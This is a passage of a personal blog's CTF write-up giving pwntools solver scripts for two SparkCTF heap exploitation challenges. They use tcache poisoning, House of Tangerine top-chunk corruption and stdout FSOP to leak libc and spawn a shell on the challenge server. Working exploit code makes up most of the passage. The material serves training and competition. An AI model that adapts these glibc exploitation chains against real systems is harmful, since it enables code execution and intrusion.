+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+
+<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">local</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
+                <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s">'''
+                        x/20gx &amp;cigs
+                        '''</span><span class="p">)</span>
+<span class="c1">###############   files setup   ###############
+</span><span class="n">local</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
+<span class="n">exe</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./main_patched"</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">nc</span><span class="o">=</span><span class="s">"nc tcp.espark.tn 5322"</span>
+<span class="n">port</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">host</span><span class="o">=</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1">############### remote or local ###############
+</span><span class="k">if</span> <span class="n">local</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+
+<span class="c1">############### helper functions ##############
+</span><span class="k">def</span> <span class="nf">send</span><span class="p">():</span>
+        <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter your choice:"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter the index: "</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"How big is the cigarette ? "</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"sing while rolling it:"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter your choice:"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter the index: "</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter your choice:"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="c1">############### main exploit    ###############
+</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+        <span class="n">alloc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">,</span><span class="sa">b</span><span class="s">"aaa"</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+        <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+
+<span class="n">show</span><span class="p">()</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"[0] You sung: "</span><span class="p">)</span>
+<span class="n">heap</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">))</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"[7] You sung: "</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span><span class="o">-</span><span class="mh">0x203b20</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+        <span class="n">alloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x390</span><span class="o">-</span><span class="mh">0x68</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]))</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+
+<span class="n">target</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_2_1_stdout_"</span><span class="p">]</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="sa">b</span><span class="s">"x"</span><span class="o">*</span><span class="mh">0xe0</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="o">^</span><span class="p">(</span><span class="n">heap</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)))</span>
+<span class="c1">#debug()
+</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>  <span class="c1"># this
+</span>
+<span class="n">f</span><span class="o">=</span><span class="n">FileStructure</span><span class="p">(</span><span class="n">null</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x2047a0</span><span class="p">)</span>
+<span class="n">stdout</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_2_1_stdout_"</span><span class="p">]</span>
+<span class="n">l</span><span class="o">=</span><span class="mh">0xe0</span>
+<span class="n">f</span><span class="p">.</span><span class="n">vtable</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_wfile_jumps"</span><span class="p">]</span><span class="o">+</span><span class="mh">0x18</span><span class="o">-</span><span class="mh">0x38</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_wide_data</span><span class="o">=</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x390</span><span class="o">-</span><span class="mh">0xe0</span>
+<span class="n">f</span><span class="p">.</span><span class="n">flags</span><span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\x04\x04</span><span class="s">;sh"</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="c1">#u64(b"\x04;sh\x00".ljust(8,b"\x00")) #0x68733bfbad4087 #u64(b"\x02;sh\x00".ljust(8,b"\x00"))  0x68733bfbad2887
+</span><span class="n">f</span><span class="p">.</span><span class="n">fileno</span><span class="o">=</span><span class="mi">1</span>
+<span class="n">f</span><span class="p">.</span><span class="n">chain</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_2_1_stdin_"</span><span class="p">]</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_read_ptr</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_read_end</span> <span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_read_base</span><span class="o">=</span><span class="mi">0</span> <span class="c1">#stdout+0x83
+</span><span class="n">f</span><span class="p">.</span><span class="n">_IO_write_base</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_write_ptr</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_write_end</span><span class="o">=</span><span class="mi">0</span> <span class="c1">#stdout+0x83
+</span><span class="n">f</span><span class="p">.</span><span class="n">_IO_buf_base</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_buf_end</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span><span class="o">+</span><span class="mi">1</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">f</span><span class="p">)))</span>
+
+
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x13</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">,</span><span class="nb">bytes</span><span class="p">(</span><span class="n">f</span><span class="p">))</span> <span class="c1"># stodut
+</span>
+
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="c1">## SparkCTF{3b09b183c6218152a3f2e2fba0d8f570f271df71926fff48f17d90eb4b7fa529}
+</span></code></pre></div></div>
+
+<h1 id="tajin">tajin</h1>
+
+<p>another heap challenge with the following menu :</p>
+
+<ul>
+  <li>allocate of whatever size</li>
+  <li>edit with fix read size 0x1000 : Heap overflow</li>
+  <li>show : prints contents of chunk</li>
+</ul>
+
+<p>notes :</p>
+
+<ul>
+  <li>no free function despite being a heap challenge xD</li>
+  <li>very decent overflow which should make life easier</li>
+</ul>
+
+<p>Plan :</p>
+
+<ul>
+  <li>its obvious by now that we need to trigger free and somehow end up corrupting tcache</li>
+  <li>our target in the heap that we can overwrite (other than the chunks themselves which are useless) is the <code class="language-plaintext highlighter-rouge">top chunk</code> that indicates how much of the heap is still left .</li>
+  <li>
+    <p>we can look up some attacks on this top chunk , one attack that looks like just what we need is <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_tangerine.c">house of tangerine</a></p>
+
+    <ul>
+      <li>what this attack does is basically change the size of the wilderness (how much is left in the heap , supposedely) , into something small like 0x500 or something similar , but it needs to still be page aligned when you sum it with it’s address .</li>
+      <li>lets suppose we changed it to 0x500 , when we request to allocate something bigger , like 0x600 , malloc will think it ran out of memory , it s_brk another heap (dont matter for this attack) , and the 0x500 chunk that malloc thinks is left , instead of wasting (which can lead to fragmentation) , it frees it .</li>
+      <li>just like that we trigger free or controllable sizes of chunks</li>
+    </ul>
+  </li>
+  <li>
+    <p>we do this attack 3 times (we can do it in 2 or even 1 ema taksir ras)</p>
+
+    <ol>
+      <li>first one to free a chunk of size 0x2e0 (7aja haka) , this will be put into tcache »&gt; we can get a heap leak</li>
+      <li>second one to free a chunk of size &gt; 0x400 to be put into unsorted bin »&gt; we get libc leak</li>
+      <li>we free a chunk of same size in attack 1 to corrupt its tcache to our target</li>
+    </ol>
+  </li>
+  <li>again i chose stdout FSOP for RCE</li>
+</ul>
+
+<p>Solver :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+
+<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">local</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
+                <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s">'''
+                        x/20gx &amp;array
+                        '''</span><span class="p">)</span>
+<span class="c1">###############   files setup   ###############
+</span><span class="n">local</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
+<span class="n">exe</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./main"</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">nc</span><span class="o">=</span><span class="s">"nc tcp.espark.tn 4595"</span>
+<span class="n">port</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+<span class="n">host</span><span class="o">=</span><span class="n">nc</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1">############### remote or local ###############
+</span><span class="k">if</span> <span class="n">local</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">])</span>
+
+<span class="c1">############### helper functions ##############
+</span><span class="k">def</span> <span class="nf">send</span><span class="p">():</span>
+        <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Size: "</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">payload</span><span class="p">):</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="c1">############### main exploit    ###############
+</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0xa00</span><span class="p">,</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0xa00</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x361</span><span class="p">))</span>  <span class="c1"># 0
+</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="p">,</span><span class="sa">b</span><span class="s">"cc"</span><span class="p">)</span>   <span class="c1">#1
+</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0xa10</span><span class="p">)</span>
+
+<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0xa10</span><span class="p">)</span>
+<span class="n">leak</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span><span class="o">&lt;&lt;</span><span class="mi">12</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+
+<span class="c1">### our available chunks are 0x361 in tcache
+</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x500</span><span class="p">,</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x500</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000005e1</span><span class="p">))</span>  <span class="c1">#2
+</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x600</span><span class="p">,</span><span class="sa">b</span><span class="s">"22222"</span><span class="p">)</span>  <span class="c1">#3
+</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x510</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x510</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span><span class="o">-</span><span class="mh">0x21ace0</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x500</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x5c1</span><span class="p">))</span>
+<span class="n">size</span><span class="o">=</span><span class="mh">0x600</span><span class="o">+</span><span class="p">(</span><span class="mh">0xe0</span><span class="o">-</span><span class="mh">0x40</span><span class="o">-</span><span class="mh">0x20</span><span class="p">)</span>  <span class="c1"># -0x20
+</span>
+<span class="c1">#alloc(size,b"2"*size+p64(0)+p64(0x341))
+</span><span class="n">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="sa">b</span><span class="s">"2"</span><span class="o">*</span><span class="n">size</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x361</span><span class="p">))</span> <span class="c1"># 4
+</span>
+
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span><span class="sa">b</span><span class="s">"9999"</span><span class="p">)</span> <span class="c1"># to push
+</span>
+<span class="n">stdout</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_2_1_stdout_"</span><span class="p">]</span>
+
+<span class="n">target</span><span class="o">=</span><span class="n">stdout</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s">"2"</span><span class="o">*</span><span class="n">size</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">target</span><span class="o">^</span><span class="p">((</span><span class="n">leak</span><span class="o">+</span><span class="mh">0x43ca0</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">12</span><span class="p">)))</span>
+
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x330</span><span class="p">,</span><span class="sa">b</span><span class="s">"aaa"</span><span class="p">)</span>
+
+
+<span class="n">f</span><span class="o">=</span><span class="n">FileStructure</span><span class="p">(</span><span class="n">null</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x21b000</span><span class="o">+</span><span class="mh">0x1000</span><span class="p">)</span>
+<span class="n">l</span><span class="o">=</span><span class="mh">0xe0</span>
+<span class="n">f</span><span class="p">.</span><span class="n">vtable</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__GI__IO_wfile_jumps"</span><span class="p">]</span><span class="o">+</span><span class="mh">0x18</span><span class="o">-</span><span class="mh">0x38</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_wide_data</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0xe0</span><span class="o">-</span><span class="mh">0xe0</span>
+<span class="n">f</span><span class="p">.</span><span class="n">flags</span><span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\x04\x04</span><span class="s">;sh"</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="c1">#u64(b"\x04;sh\x00".ljust(8,b"\x00")) #0x68733bfbad4087 #u64(b"\x02;sh\x00".ljust(8,b"\x00"))  0x68733bfbad2887
+</span><span class="n">f</span><span class="p">.</span><span class="n">fileno</span><span class="o">=</span><span class="mi">1</span>
+<span class="n">f</span><span class="p">.</span><span class="n">chain</span><span class="o">=</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"_IO_2_1_stdin_"</span><span class="p">]</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_read_ptr</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_read_end</span> <span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_read_base</span><span class="o">=</span><span class="mi">0</span> <span class="c1">#stdout+0x83
+</span><span class="n">f</span><span class="p">.</span><span class="n">_IO_write_base</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_write_ptr</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_write_end</span><span class="o">=</span><span class="mi">0</span> <span class="c1">#stdout+0x83
+</span><span class="n">f</span><span class="p">.</span><span class="n">_IO_buf_base</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span>
+<span class="n">f</span><span class="p">.</span><span class="n">_IO_buf_end</span><span class="o">=</span><span class="n">stdout</span><span class="o">+</span><span class="mh">0x83</span><span class="o">+</span><span class="mi">1</span>
+<span class="n">debug</span><span class="p">()</span>
+
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x330</span><span class="p">,</span><span class="nb">bytes</span><span class="p">(</span><span class="n">f</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x21b860</span><span class="o">+</span><span class="mi">8</span><span class="o">-</span><span class="mh">0x68</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]))</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="c1">## SparkCTF{b27562cf8ef93a1663e16cc1128686ba03985d2284a13eec04cba69ad9034e39}
+</span>
+</code></pre></div></div>
+
+</article>
+
+            </main><footer>
+    <div class="window-container">
+        <div class="window">
+            <div class="contacts">
+                <p><a href="https://github.com/buddurid">Github</a></p>
+                <p><a href="mailto:bbahae624@gmail.com">Email</a></p>
+                <p><a href="https://x.com/buddurid">Twitter</a></p>
+                <p><a href="https://www.linkedin.com/in/bahae-bahrini/">LinkedIn</a></p>
+                <p><a href="">Discord:#buddurid</a></p>
+                <p><a href="">CTFTime</a></p>
+            </div>
+            <p>©2024    Buddurid</p>
+            <p>Hosted on <a href="https://github.com/buddurid/buddurid.github.io/">GitHub Pages.</a></p>
+        </div>
